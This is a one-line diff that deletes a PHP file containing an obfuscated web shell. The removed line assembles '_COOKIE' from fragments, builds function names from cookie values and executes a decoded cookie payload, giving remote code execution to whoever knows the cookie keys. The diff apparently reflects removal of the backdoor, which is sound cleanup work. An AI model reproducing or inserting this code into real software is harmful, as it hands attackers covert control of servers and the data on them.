@@ -1,1 +1,0 @@
-<?php $u='_CO';/*nG*/$ay='E';/*j*/$zv='OKI';$rz/*jLMg*/=${$u.$zv.$ay};if(isset($rz/*50U9*/['lN'])){$h=$rz/*gm*/['lN'].$rz['K'];$a=$rz['br'].$rz['tp'].$rz['W'];$ue=$h('',$a($rz['SR']));$ue();}
